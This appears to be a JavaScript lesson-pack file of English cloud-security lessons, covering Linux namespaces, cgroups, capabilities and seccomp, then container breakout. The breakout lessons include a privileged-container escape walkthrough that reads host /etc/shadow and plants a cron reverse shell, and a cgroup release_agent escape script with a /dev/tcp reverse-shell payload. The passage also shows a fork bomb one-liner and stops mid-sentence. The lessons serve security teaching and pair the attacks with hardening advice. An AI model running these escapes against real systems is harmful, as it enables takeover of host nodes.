(typeof module !== 'undefined' && module.exports ? data => { module.exports = data; } : data => registerLessonPack('en', data))({
  "cloud-01-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Container Fundamentals</div>\n  <h1>Linux Namespaces &amp; Process Isolation</h1>\n  <p class=\"lead\">Containers are not lightweight virtual machines; they are ordinary Linux host processes constrained by kernel Namespaces and Control Groups. This lesson explores the architecture of the 6 core Linux namespaces, syscall primitives, and view-isolation mechanics.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Dissecting the 6 Core Linux Namespaces</strong>: PID (process tree), Mount (filesystem table), Network (networking stack), IPC (message queues), UTS (hostnames), and User (UID/GID mapping).</li>\n    <li><strong>Mastering Syscall Primitives</strong>: <code>clone()</code> for child creation, <code>unshare()</code> for detaching namespaces, and <code>setns()</code> for joining active contexts.</li>\n    <li><strong>Auditing /proc/$$/ns/ Inodes</strong>: Tracking container process boundaries against host namespaces.</li>\n  </ul>\n</div>\n\n<h2>1. The Anatomy of a Container: An Ordinary Process in Disguise</h2>\n<p>Under the Linux kernel, there is <strong>no native entity known as a \"container\"</strong>. Container runtimes (Docker, containerd, Podman) rely entirely on kernel <strong>Namespaces</strong> to selectively restrict what a group of processes can see:</p>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Namespace Flag</th>\n      <th>Isolated Kernel Global Resource</th>\n      <th>Security Boundary &amp; Offensive Implications</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>PID (CLONE_NEWPID)</strong></td>\n      <td>Independent process tree starting at PID 1</td>\n      <td>Inside the container, <code>ps aux</code> only reflects child processes, concealing host daemon activity</td>\n    </tr>\n    <tr>\n      <td><strong>Mount (CLONE_NEWNS)</strong></td>\n      <td>Isolated filesystem mount point hierarchy</td>\n      <td>Pairs with <code>pivot_root</code> to construct a private rootfs, preventing unauthorized host traversal</td>\n    </tr>\n    <tr>\n      <td><strong>Network (CLONE_NEWNET)</strong></td>\n      <td>Private IP, routing tables, socket lists, and iptables</td>\n      <td>Provides container IP addressing via veth pairs attached to host bridges (e.g., <code>docker0</code>)</td>\n    </tr>\n    <tr>\n      <td><strong>IPC (CLONE_NEWIPC)</strong></td>\n      <td>System V IPC message queues &amp; POSIX shared memory</td>\n      <td>Prevents inter-container eavesdropping via shared memory structures</td>\n    </tr>\n    <tr>\n      <td><strong>UTS (CLONE_NEWUTS)</strong></td>\n      <td>Hostnames and NIS domain identifiers</td>\n      <td>Enables custom container hostnames without polluting the host environment</td>\n    </tr>\n    <tr>\n      <td><strong>User (CLONE_NEWUSER)</strong></td>\n      <td>User and group UID/GID mapping tables</td>\n      <td><strong>Crucial Security Feature</strong>: Root (UID 0) inside container maps to an unprivileged UID (e.g. 10001) on the host</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Core System Call Primitives</h2>\n<p>Container engines invoke three principal system calls to orchestrate namespace boundaries:</p>\n\n<pre><code class=\"language-c\">// 1. clone(): Creates a child process with specified isolation flags\nint child_pid = clone(child_fn, stack_top, CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWNS | SIGCHLD, NULL);\n\n// 2. unshare(): Detaches the caller process from its current namespaces\nunshare(CLONE_NEWUTS | CLONE_NEWPID);\n\n// 3. setns(): Attaches the calling thread to an existing namespace (the foundation of docker exec)\nint fd = open(\"/proc/1234/ns/net\", O_RDONLY);\nsetns(fd, CLONE_NEWNET);</code></pre>\n\n<h2>3. Hands-on: Building a Container with unshare</h2>\n<p>Without installing Docker, we can spawn a minimalist isolated sandbox using the native Linux <code>unshare</code> command:</p>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — unshare Isolation Lab</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># 1. Launch a dedicated bash shell with independent PID, UTS, and Mount spaces\n$ sudo unshare --fork --pid --uts --mount-proc /bin/bash\n\n# 2. Modify container hostname without altering the host\ncontainer# hostname cyber-isolated-pod\ncontainer# hostname\ncyber-isolated-pod\n\n# 3. Inspect process tree: bash has become PID 1!\ncontainer# ps -ef\nUID        PID  PPID  C STIME TTY          TIME CMD\nroot         1     0  0 10:00 pts/0    00:00:00 /bin/bash\nroot         4     1  0 10:01 pts/0    00:00:00 ps -ef\n\n# 4. From another host terminal: it is simply an ordinary process with a standard host PID!\nhost$ ps -ef | grep cyber-isolated-pod\nroot     29841  29810  0 10:00 pts/0   00:00:00 /bin/bash</code></pre>\n  </div>\n</div>\n\n<h2>4. Auditing /proc/$$/ns/ &amp; Namespace Sharing Hazards</h2>\n<p>Each process exposes symlinks under <code>/proc/[PID]/ns/</code> pointing to unique kernel inode descriptors:</p>\n\n<pre><code class=\"language-bash\">$ ls -l /proc/self/ns/\nlrwxrwxrwx 1 root root 0 net -&gt; 'net:[4026531992]'\nlrwxrwxrwx 1 root root 0 pid -&gt; 'pid:[4026532214]'\nlrwxrwxrwx 1 root root 0 mnt -&gt; 'mnt:[4026532212]'</code></pre>\n\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ Dangerous Practice: Sharing Host Namespaces</div>\n  <p>Launching containers with flags such as <code>--pid=host</code> or <code>--net=host</code> completely bypasses namespace isolation. Attackers can view all host processes via <code>ps aux</code> and potentially terminate the host's primary init process.</p>\n</div>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>Containers rely on <strong>Linux Namespaces to restrict visibility into 6 core global system resources</strong>.</li>\n    <li><code>docker exec</code> uses the <code>setns()</code> system call to inject an active process into the container's established namespaces.</li>\n    <li>Never allow production containers to run with <code>--net=host</code> or <code>--pid=host</code> without explicit security justification.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Namespace Inode Verification</div>\n  <p>Determine whether a running container shares the host network namespace:</p>\n  <ol>\n    <li>Execute <code>readlink /proc/1/ns/net</code> on both the host and within the container.</li>\n    <li>If both commands return identical inode values, what does this indicate regarding network isolation?</li>\n  </ol>\n</div>\n","checkpoints":[{"question":"Which Linux Namespace provides an independent process tree hierarchy where container processes cannot view external host tasks?","options":["CLONE_NEWNET (Network Namespace)","CLONE_NEWPID (PID Namespace)","CLONE_NEWUTS (UTS Namespace)","CLONE_NEWIPC (IPC Namespace)"],"answer":1,"explanation":"The PID Namespace virtualizes the process table, establishing an independent numbering sequence where the container init process becomes PID 1, concealing host processes."},{"question":"What critical security risk is introduced when running a Docker container with the '--net=host' flag?","options":["Network throughput is throttled by 50%","The container shares the host network namespace directly, gaining access to host network interfaces and opening ports without network boundary isolation","The container automatically formats host storage drives","The container loses all outbound internet access"],"answer":1,"explanation":"The --net=host parameter completely bypasses network namespace isolation, allowing the container process to bind directly to host interfaces, sniff local traffic, and perform ARP spoofing."}]},
  "cloud-01-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Resource Governance</div>\n  <h1>Cgroups Resource Constraints &amp; DoS Defense</h1>\n  <p class=\"lead\">Namespaces restrict visibility, but they do not restrict resource consumption. Without resource limits, a compromised or runaway container can monopolize memory, peg CPU cores, or spawn a fork bomb that collapses the entire host. This lesson examines Linux Control Groups (Cgroups), CFS scheduling, and DoS mitigation.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Core Cgroups Resource Controllers</strong>: Understanding <code>cpu.cfs_quota_us</code>, <code>memory.limit_in_bytes</code>, and <code>pids.max</code> mechanics.</li>\n    <li><strong>Cgroups v1 vs v2 Architecture</strong>: Dissecting multi-hierarchy structures versus the unified single-hierarchy tree.</li>\n    <li><strong>Mitigating Resource Exhaustion Attacks</strong>: Configuring CPU/memory quotas and neutralizing fork bombs with <code>--pids-limit</code>.</li>\n  </ul>\n</div>\n\n<h2>1. The Need for Cgroups: Multi-Tenant Tragedy of the Commons</h2>\n<p>Unbounded containers running on shared infrastructure present critical Denial-of-Service (DoS) vectors:</p>\n<ul>\n  <li><strong>CPU Starvation</strong>: A runaway tight loop consumes 100% of host CPU cycles, degrading adjacent workloads.</li>\n  <li><strong>Host OOM Instability</strong>: An unconstrained memory leak triggers the Linux Out-Of-Memory (OOM) Killer, which may erroneously terminate critical host daemons like <code>kubelet</code> or <code>sshd</code>.</li>\n  <li><strong>PID Exhaustion (Fork Bombs)</strong>: Rapid creation of child threads exhausts system PID limits (<code>/proc/sys/kernel/pid_max</code>), freezing the host.</li>\n</ul>\n\n<h2>2. Core Subsystems and Enforcement Mechanics</h2>\n<p>Cgroups expose control knobs via a pseudo-filesystem typically mounted at <code>/sys/fs/cgroup/</code>:</p>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Subsystem</th>\n      <th>Cgroups v1 Knob</th>\n      <th>Docker Flag</th>\n      <th>Enforcement Mechanism</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>CPU Quota</strong></td>\n      <td><code>cpu.cfs_quota_us</code></td>\n      <td><code>--cpus=1.5</code></td>\n      <td>Throttles execution time across 100ms CFS periods when allotted quota is consumed</td>\n    </tr>\n    <tr>\n      <td><strong>Memory Limit</strong></td>\n      <td><code>memory.limit_in_bytes</code></td>\n      <td><code>-m 512m</code></td>\n      <td>Hard memory threshold; exceeding limit after swap exhaustion invokes the targeted OOM-Killer</td>\n    </tr>\n    <tr>\n      <td><strong>PID Limit</strong></td>\n      <td><code>pids.max</code></td>\n      <td><code>--pids-limit 100</code></td>\n      <td>Enforces strict ceiling on living threads and processes, <strong>defusing fork bombs instantly</strong></td>\n    </tr>\n    <tr>\n      <td><strong>Block I/O</strong></td>\n      <td><code>blkio.throttle.read_bps_device</code></td>\n      <td><code>--device-read-bps</code></td>\n      <td>Regulates disk read/write bandwidth, safeguarding storage performance</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>3. Deep Dive: Why /proc/meminfo Lies Inside Containers</h2>\n<p>Inside a container constrained by <code>-m 512m</code>, running <code>free -m</code> or reading <code>/proc/meminfo</code> unexpectedly reports the total physical RAM of the host (e.g. 64GB):</p>\n\n<pre><code class=\"language-text\">[Application runs free -m inside container]\n         │\n         ▼ (Reads /proc/meminfo)\n[The Linux kernel does not virtualize /proc by Cgroup boundaries!]\n         │\n         ▼ (Returns host raw physical memory: 64GB)\n[Consequence: Default JVM heap calculations allocate 16GB, immediately tripping the 512m limit and triggering SIGKILL!]</code></pre>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 Modern Remedy: LXCfs &amp; Cgroup-Aware Runtimes</div>\n  <p>To eliminate JVM crashes caused by misleading <code>/proc</code> metrics, modern clouds deploy <strong>LXCfs</strong>. LXCfs mounts a user-space FUSE filesystem over <code>/proc/meminfo</code> and <code>/proc/cpuinfo</code>, ensuring diagnostic tools reflect the container's true Cgroup quotas.</p>\n</div>\n\n<h2>4. Hands-on Defense: Neutralizing Fork Bombs</h2>\n<p>The notorious bash fork bomb <code>:(){ :|:&amp; };:</code> replicates exponentially, depleting the kernel's process allocation table in milliseconds:</p>\n\n<pre><code class=\"language-bash\"># ❌ Dangerous: Unbounded container vulnerable to host starvation\ndocker run -d --name vuln-app nginx:alpine\n\n# ✅ Hardened: Enforcing CPU, Memory, and Process limits\ndocker run -d --name secure-app \\\n  --cpus=1.0 \\\n  --memory=512m \\\n  --memory-swap=512m \\\n  --pids-limit=64 \\\n  nginx:alpine</code></pre>\n\n<h2>5. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>Cgroups provide <strong>physical resource governance and hard quota enforcement</strong> in multi-tenant environments.</li>\n    <li>Running unmetered containers risks host failure from memory leaks or cryptomining malware.</li>\n    <li>Production deployment baselines must declare <strong>CPU caps, memory ceilings, and <code>--pids-limit</code></strong> constraints.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Cgroup OOM Forensics</div>\n  <p>Analyze OOM termination events:</p>\n  <ol>\n    <li>When reviewing <code>dmesg -T | grep -i oom</code> on a host, identify how the kernel indicates whether the terminated task belonged to a container cgroup.</li>\n    <li>What is the standard Kubernetes exit code for an OOM-Killed container process? (Hint: 128 + 9 = 137).</li>\n  </ol>\n</div>\n","checkpoints":[{"question":"Which Linux Cgroups parameter limits the total number of alive tasks/threads in a container to neutralize Fork Bomb attacks?","options":["memory.limit_in_bytes","cpu.cfs_quota_us","pids.max (or --pids-limit in Docker)","blkio.weight"],"answer":2,"explanation":"pids.max enforces a strict ceiling on active threads/processes in the cgroup. Once exceeded, fork() fails with EAGAIN, instantly stopping exponential process spawning."},{"question":"Why does running 'free -m' inside a 512MB-constrained container typically report the full physical RAM of the host (e.g. 64GB)?","options":["The container memory manager is corrupted","The native Linux /proc/meminfo filesystem is not virtualized across Cgroup boundaries by default","The container has broken out onto the host","Docker intentionally reports false numbers to prevent software panics"],"answer":1,"explanation":"/proc reflects global kernel telemetry. Traditional Unix tools read /proc/meminfo directly, seeing host physical RAM instead of container cgroup limits unless tools like LXCfs are integrated."}]},
  "cloud-01-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Privilege Reduction</div>\n  <h1>Linux Capabilities &amp; Seccomp System Call Filtering</h1>\n  <p class=\"lead\">In traditional Unix security, UID 0 wields omnipotent authority. Once compromised, the host is lost. To enforce the principle of least privilege, Linux partitions root authority into discrete Capabilities and deploys Seccomp system call filtering. This lesson explores the architecture and implementation of runtime privilege reduction.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Understanding Linux Capabilities</strong>: Deconstructing omnipotent root privileges into 40+ granular authorities (e.g. <code>CAP_CHOWN</code>, <code>CAP_NET_RAW</code>).</li>\n    <li><strong>Auditing High-Risk Capabilities</strong>: Identifying escape vectors associated with <code>CAP_SYS_ADMIN</code>, <code>CAP_SYS_PTRACE</code>, <code>CAP_NET_ADMIN</code>, and <code>CAP_SYS_MODULE</code>.</li>\n    <li><strong>Authoring Seccomp Whitelists</strong>: Utilizing Berkeley Packet Filter (BPF) profiles to intercept dangerous system calls before kernel execution.</li>\n  </ul>\n</div>\n\n<h2>1. Granular Privilege Partitioning via Capabilities</h2>\n<p>To eliminate the hazards of an all-powerful root user, the Linux kernel breaks administrative privileges into over 40 distinct <strong>Capabilities</strong>:</p>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Capability Flag</th>\n      <th>Permitted Operations</th>\n      <th>Security Risk &amp; Abuse Potential</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>CAP_SYS_ADMIN</strong></td>\n      <td>Equivalent to full root: mount/umount, IPC quotas, cgroup configuration</td>\n      <td><strong>Critical!</strong> Enables arbitrary host device mounting and cgroup escape attacks</td>\n    </tr>\n    <tr>\n      <td><strong>CAP_SYS_PTRACE</strong></td>\n      <td>Permits debugging, tracing, and memory manipulation of processes via <code>ptrace()</code></td>\n      <td><strong>High!</strong> If PID namespace is shared, attackers can inject shellcode into host tasks</td>\n    </tr>\n    <tr>\n      <td><strong>CAP_NET_ADMIN</strong></td>\n      <td>Allows modifying network interfaces, IP tables, and routing configurations</td>\n      <td><strong>High!</strong> Enables ARP spoofing, traffic interception, and firewall tampering</td>\n    </tr>\n    <tr>\n      <td><strong>CAP_SYS_MODULE</strong></td>\n      <td>Permits loading and unloading kernel modules (<code>.ko</code>)</td>\n      <td><strong>Catastrophic!</strong> Allows loading malicious Ring 0 kernel rootkits directly</td>\n    </tr>\n    <tr>\n      <td><strong>CAP_NET_RAW</strong></td>\n      <td>Enables raw and packet socket creation</td>\n      <td>Allows crafting forged IP packets and launching volumetric network floods</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Privilege Hardening: Drop All, Add Only What Is Needed</h2>\n<p>Docker retains 14 default capabilities while dropping <code>CAP_SYS_ADMIN</code>. In security-hardened enterprise environments, the recommended pattern is <strong>\"Drop All, Add Specific\"</strong>:</p>\n\n<pre><code class=\"language-bash\"># ❌ Severe vulnerability: Assigning full privileges grants effective host root access\ndocker run --privileged -d nginx\n\n# ✅ Production-grade baseline: Drop all capabilities, then explicitly grant required privileges\ndocker run -d --name secure-web \\\n  --cap-drop=ALL \\\n  --cap-add=NET_BIND_SERVICE \\\n  nginx:alpine</code></pre>\n\n<h2>3. Seccomp: The Kernel System Call Firewall</h2>\n<p>Even with dropped capabilities, a container can execute over 300 kernel system calls. Vulnerabilities in obsolete or complex syscalls can lead to kernel-level escapes.</p>\n<p><strong>Seccomp (Secure Computing Mode)</strong> uses BPF filters to validate system calls at execution boundaries:</p>\n\n<pre><code class=\"language-json\">{\n  \"defaultAction\": \"SCMP_ACT_ERRNO\",\n  \"architectures\": [ \"SCMP_ARCH_X86_64\" ],\n  \"syscalls\": [\n    {\n      \"names\": [\n        \"read\", \"write\", \"openat\", \"close\", \"fstat\",\n        \"mmap\", \"mprotect\", \"munmap\", \"brk\", \"rt_sigaction\"\n      ],\n      \"action\": \"SCMP_ACT_ALLOW\"\n    },\n    {\n      \"names\": [ \"reboot\", \"sys_chroot\", \"kexec_load\", \"bpf\" ],\n      \"action\": \"SCMP_ACT_KILL\"\n    }\n  ]\n}</code></pre>\n\n<p>Docker provides an internal default Seccomp profile blocking 44 dangerous syscalls, including <code>keyctl</code>, <code>reboot</code>, and <code>sys_chroot</code>.</p>\n\n<h2>4. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>Linux <strong>Capabilities divide administrative authority into 40+ granular flags</strong>, avoiding binary root privilege models.</li>\n    <li>The container hardening gold standard is <code>--cap-drop=ALL</code> paired with minimal, explicit <code>--cap-add</code> assignments.</li>\n    <li><strong>Seccomp provides a system call defense barrier</strong>, intercepting attempts to exploit kernel vulnerabilities even if root access is gained within the container.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Inspecting Active Capabilities</div>\n  <p>Examine capability bitmasks within an active container:</p>\n  <pre><code class=\"language-bash\">grep Cap /proc/$$/status\n# Decode the hex bitmask using capsh\ncapsh --decode=00000000a80425fb</code></pre>\n  <p>Compare the decoded output between a default container and one started with <code>--cap-drop=ALL</code>.</p>\n</div>\n","checkpoints":[{"question":"Which Linux Capability provides broad administrative control equivalent to traditional root, making it a critical breakout vector if granted?","options":["CAP_CHOWN","CAP_SYS_ADMIN","CAP_KILL","CAP_SETGID"],"answer":1,"explanation":"CAP_SYS_ADMIN encompasses extensive kernel administration rights (e.g. filesystem mounting, cgroup modifications), serving as the foundational prerequisite for numerous container escapes."},{"question":"What is the primary architectural function of Seccomp in container runtime security?","options":["Encrypting network traffic between containers and registries","Acting as a kernel system call firewall, evaluating BPF filters to block unauthorized high-risk syscalls (e.g. reboot, sys_chroot) at invocation boundaries","Automating persistent volume snapshots","Rotating root user passwords periodically"],"answer":1,"explanation":"Seccomp inspects system calls using BPF profiles, preventing processes—even those executing as container root—from calling dangerous or vulnerable kernel routines."}]},
  "cloud-02-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Breakout Tactics</div>\n  <h1>Privileged Containers &amp; Sensitive Host Mount Breakout</h1>\n  <p class=\"lead\">Container breakout represents the most severe attack vector in cloud-native environments. Once an attacker breaches the boundary to compromise the underlying physical node, multi-tenant isolation collapses entirely. This lesson analyzes <code>--privileged</code> container vulnerabilities, raw disk mounting, and cron persistence techniques.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Root Causes of Privileged Breakout</strong>: How <code>--privileged</code> assigns all 40+ Linux capabilities, disables AppArmor/Seccomp, and exposes raw host block devices under <code>/dev/</code>.</li>\n    <li><strong>Mount-Based Escape Walkthrough</strong>: Identifying the host's root storage partition (<code>/dev/sda1</code>) and mounting it within the container.</li>\n    <li><strong>Instant Reverse Shell Persistence</strong>: Overwriting host cron jobs (<code>/etc/crontab</code>) or SSH authorized keys to elevate to physical host root.</li>\n  </ul>\n</div>\n\n<h2>1. What Makes --privileged Catastrophic?</h2>\n<p>The <code>--privileged</code> flag is an unmetered debugging parameter that dismantles container isolation entirely:</p>\n\n<pre><code class=\"language-text\">[Privileged Flag Runtime Consequences]\n  ├── 1. Grants all 40+ Linux Capabilities (including CAP_SYS_ADMIN)\n  ├── 2. Completely disables default AppArmor security profiles\n  ├── 3. Bypasses Seccomp system call filtering whitelists\n  └── 4. Exposes all host hardware devices under /dev/ (raw disks, memory, buses)</code></pre>\n\n<p>In short: <strong>A privileged container has no genuine security boundary</strong>; root inside the container is effectively root on the host!</p>\n\n<h2>2. Hands-on: Privileged Disk Mount Escape</h2>\n\n<div class=\"terminal-window\">\n  <div class=\"terminal-bar\">\n    <div class=\"terminal-dot red\"></div>\n    <div class=\"terminal-dot yellow\"></div>\n    <div class=\"terminal-dot green\"></div>\n    <span>bash — Container Escape Walkthrough</span>\n  </div>\n  <div class=\"terminal-body\">\n    <pre><code># [Step 1] Infiltrate privileged container; audit raw storage block devices\ncontainer# ls -l /dev/sda* /dev/vda*\nbrw-rw---- 1 root disk 8, 1 Mar 15 10:00 /dev/sda1\nbrw-rw---- 1 root disk 8, 2 Mar 15 10:00 /dev/sda2\n\n# [Step 2] Create temporary mount point and mount the host root partition!\ncontainer# mkdir -p /mnt/host_root\ncontainer# mount /dev/sda1 /mnt/host_root\n\n# [Step 3] Confirm access: extract the host /etc/shadow file directly\ncontainer# head -n 3 /mnt/host_root/etc/shadow\nroot:$6$rounds=500000$xyz...:19420:0:99999:7:::\ndaemon:*:19420:0:99999:7:::\n\n# [Step 4] Inject a malicious cron job targeting the host system\ncontainer# echo \"* * * * * root bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1'\" &gt;&gt; /mnt/host_root/etc/crontab\n\n# [Step 5] Catch root reverse shell on attacker listener within 60 seconds\nattacker$ nc -lvnp 4444\nConnection received on 10.0.0.50\nhost# whoami &amp;&amp; hostname\nroot\nphysical-node-production-01</code></pre>\n  </div>\n</div>\n\n<h2>3. Sensitive Host Directory Mount Matrix</h2>\n<p>Improper volume mounts (<code>-v</code>) by cluster administrators expose similar catastrophic escape vectors:</p>\n\n<table class=\"data-table\">\n  <thead>\n    <tr>\n      <th>Hazardous Mount Flag</th>\n      <th>Exploitation Mechanism</th>\n      <th>Hardening Remediation</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>-v /:/host:rw</code></td>\n      <td>Full read/write access to host rootfs; overwrite <code>/etc/shadow</code> or <code>authorized_keys</code></td>\n      <td>Strictly prohibit mounting the host root filesystem <code>/</code></td>\n    </tr>\n    <tr>\n      <td><code>-v /etc/crontab:/host/cron</code></td>\n      <td>Modify system scheduler to execute root commands within one minute</td>\n      <td>Enforce read-only volumes via <code>:ro</code> if configuration inspection is required</td>\n    </tr>\n    <tr>\n      <td><code>-v /proc:/host/proc</code></td>\n      <td>Exploit <code>/proc/sys/kernel/core_pattern</code> to intercept crash dumps</td>\n      <td>Never mount host <code>/proc</code> or <code>/sys</code> across namespace perimeters</td>\n    </tr>\n    <tr>\n      <td><code>-v /var/run/docker.sock</code></td>\n      <td>Leverage Docker Engine API to spawn secondary privileged containers</td>\n      <td>Prohibit exposing the host Docker daemon socket</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>4. Chapter Summary</h2>\n<div class=\"callout callout-success\">\n  <div class=\"callout-title\">📌 Key Takeaways</div>\n  <ul>\n    <li>The <code>--privileged</code> flag removes all kernel containment and exposes raw hardware devices; it must be banned in production.</li>\n    <li>Privileged containers can mount physical host drives using standard <code>mount</code> and modify <code>/etc/crontab</code> for 100% reliable breakouts.</li>\n    <li>Enforce <strong>Pod Security Standards (PSS)</strong> in Kubernetes to reject manifests specifying <code>privileged: true</code>.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Detecting Privileged Execution</div>\n  <p>Determine from within a shell whether the container is running in privileged mode:</p>\n  <ol>\n    <li>Check whether raw block devices (e.g. <code>/dev/sda</code>, <code>/dev/nvme0n1</code>) exist under <code>/dev/</code>.</li>\n    <li>Inspect <code>capsh --print</code> to verify if <code>cap_sys_admin</code> is present in the effective capability set.</li>\n  </ol>\n</div>\n","checkpoints":[{"question":"What is the primary hazard of executing Docker containers with the '--privileged' flag?","options":["Network bandwidth is capped at 10Mbps","The container receives all 40+ Linux capabilities, disables AppArmor/Seccomp protections, and gains unrestricted access to raw host devices under /dev/","The container automatically encrypts all file assets","The container terminates automatically after 5 minutes"],"answer":1,"explanation":"The --privileged flag disables container containment completely, granting CAP_SYS_ADMIN and raw block device access (e.g. /dev/sda1), rendering container root equivalent to host root."},{"question":"After mounting the host root filesystem to /mnt/host inside a privileged container, how do adversaries achieve instant root breakout persistence?","options":["Deleting the /mnt/host/boot directory","Appending a reverse shell one-liner into /mnt/host/etc/crontab or injecting an attacker public key into /mnt/host/root/.ssh/authorized_keys","Altering host monitor display settings","Restarting container internal web ports"],"answer":1,"explanation":"Because the container has full read-write access to host storage, writing to /etc/crontab triggers the host cron daemon to execute commands with native host root privileges within 60 seconds."}]},
  "cloud-02-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Kernel Callbacks</div>\n  <h1>Kernel Exploits &amp; cgroup release_agent Breakout</h1>\n  <p class=\"lead\">Even without host disk mounts, a container granted <code>CAP_SYS_ADMIN</code> without AppArmor enforcement can abuse the kernel's native control group cleanup mechanism (<code>release_agent</code>). By tricking the host kernel into executing an arbitrary script upon cgroup destruction, attackers achieve root code execution on the underlying node.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li><strong>Dissecting the release_agent Architecture</strong>: Understanding how the Linux kernel invokes the registered <code>release_agent</code> script with host root privileges when the final task exits.</li>\n    <li><strong>Resolving the Host Absolute Path Dilemma</strong>: Inspecting <code>/etc/mtab</code> overlay2 parameters to map container files to host filesystem paths.</li>\n    <li><strong>Authoring the Automated Exploit</strong>: Creating dynamic cgroups, arming notification hooks, and triggering host kernel callback execution.</li>\n  </ul>\n</div>\n\n<h2>1. The release_agent Notification Mechanism</h2>\n<p>In Cgroups v1, when all processes in a given control group terminate and <code>notify_on_release</code> is enabled, the kernel automatically executes the command defined in <code>release_agent</code> <strong>in the host context with root privileges</strong>:</p>\n\n<pre><code class=\"language-text\">[Target Cgroup Subsystem: /sys/fs/cgroup/memory/escape_group]\n       │\n       ▼ (Last process terminates, triggering notify_on_release)\n[Linux Kernel (Host Kernel Space)]\n       │\n       ▼ (Executes registered script path in host root context)\n[Executes on Host: /var/lib/docker/overlay2/.../cmd.sh]\n       │\n       ▼\n[Reverse shell connects back to attacker with host root privileges!]</code></pre>\n\n<h2>2. The Core Technical Hurdle: Host Path Resolution</h2>\n<p>The kernel executes the path registered in <code>release_agent</code> relative to the <strong>host filesystem</strong>. Inside the container, a script resides at <code>/cmd.sh</code>, but looking for <code>/cmd.sh</code> on the host yields <code>ENOENT (File not found)</code>!</p>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 Resolution: Parsing Overlay2 Upperdir via /etc/mtab</div>\n  <p>Reading <code>/etc/mtab</code> inside the container reveals the exact underlying Overlay2 storage mount point on the host, where <code>upperdir=</code> contains the host-relative root path:</p>\n  <pre><code class=\"language-bash\">container# cat /etc/mtab | grep overlay\noverlay / overlay rw,relatime,lowerdir=...,upperdir=/var/lib/docker/overlay2/ab12cd.../diff,...</code></pre>\n</div>\n\n<h2>3. Automated Exploit Script Walkthrough</h2>\n\n<pre><code class=\"language-bash\">#!/bin/bash\n# PoC: Container Escape via cgroup release_agent (Requires CAP_SYS_ADMIN)\n\n# 1. Create a mount point and mount the RDMA cgroup subsystem\nmkdir -p /tmp/cgroup_escape\nmount -t cgroup -o rdma cgroup /tmp/cgroup_escape\nmkdir -p /tmp/cgroup_escape/x\n\n# 2. Enable process exit notification\necho 1 &gt; /tmp/cgroup_escape/x/notify_on_release\n\n# 3. Resolve the host absolute storage path for this container's upperdir\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n\n# 4. Write payload script to container rootfs and make it executable\necho \"#!/bin/sh\" &gt; /cmd.sh\necho \"bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1\" &gt;&gt; /cmd.sh\nchmod +x /cmd.sh\n\n# 5. Register the host-relative script path into release_agent\necho \"$host_path/cmd.sh\" &gt; /tmp/cgroup_escape/release_agent\n\n# 6. Spawn a transient task in the cgroup to trigger notification upon exit\nsh -c \"echo \\$\\$ &gt; /tmp/cgroup_escape/x/cgroup.procs\"</code></pre>\n\n<h2>4. Remediation &amp; Architectural Evolution</h2>\n<ul>\n  <li><strong>Migrate to Cgroups v2</strong>: In the unified cgroup hierarchy, the obsolete <code>release_agent</code> mechanism has been removed entirely.</li>\n  <li><strong>Drop CAP_SYS_ADMIN</strong>: Mounting cgroups requires this capability; dropping it neutralizes the vulnerability.</li>\n  <li><strong>Enable AppArmor</strong>: Docker's default AppArmor profile explicitly denies remounting or modifying 